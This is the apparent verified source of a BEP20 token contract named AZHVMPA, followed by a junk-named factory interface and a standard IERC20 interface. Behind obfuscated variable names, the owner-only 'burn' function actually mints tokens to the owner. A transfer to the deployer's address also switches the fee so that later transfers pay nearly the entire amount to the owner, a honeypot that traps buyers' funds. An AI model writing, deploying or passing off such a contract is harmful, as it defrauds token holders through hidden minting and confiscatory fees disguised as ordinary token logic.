/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.6.10;
contract AZHVMPA {
string public  symbol = "AZHVMPA";
address private  WUWFOT = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant BSRDHP = 99999;
address private  EQAFCI = address(0);
uint256 private  RAMGQX = 100000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "AZHVMPA";
uint256 private  PVLEIB = 1000000000000000;
uint256 private  UODEXL = 10000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
mapping (address => uint256) public balanceOf;
uint256 private  DSLCFU = 1000000000000000000;
uint256 private  YITZMD = 1000000000000000000;
address private  ZWFBRP = address(0);
uint8 public constant decimals = 18;
address private  XPENKR = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  BAIMVB = 10000000000000;
uint256 private  FAXWHL = 1000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  MPNLRM = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
function _getBAIMVB() private returns (uint256) {
return BAIMVB;
}

function _getFAXWHL() private returns (uint256) {
return FAXWHL;
}

function _getEQAFCI() private returns (address) {
return EQAFCI;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tSLPWLR 0");
require(spender != address(0), "fSLPWLR 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getPVLEIB() private returns (uint256) {
return PVLEIB;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "SLPWLR");
require(to != address(0), "SLPWLR");
require(amount <= balanceOf[from], "SLPWLR");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* BSRDHP/YITZMD ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==XPENKR){
YITZMD = BSRDHP+2;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () public {
XPENKR = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getRAMGQX() private returns (uint256) {
return RAMGQX;
}

function _getZWFBRP() private returns (address) {
return ZWFBRP;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getWUWFOT() private returns (address) {
return WUWFOT;
}

function _getDSLCFU() private returns (uint256) {
return DSLCFU;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}

//v1
interface IUniswapV2Factorydsd {
    event PairCreate(address indexed token0, address indexed token1, address pair, uint);
    function fundTodsaeqew() external view returns (address);
    function fundToadddfsdsdfd() external view returns (address);
    function getdsfjhjsdPair3(address tokenA, address tokenB) external view returns (address pair);
    function allPagfhfghgirs(uint) external view returns (address pair);
    function allPaigsLength() external view returns (uint);
    function createhgkPair(address tokenA, address tokenB) external returns (address pair);
    function setLkjhkerewPTo(address) external;
    function setLPjlhTrewoadd(address) external;
}

///////////////////////////

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}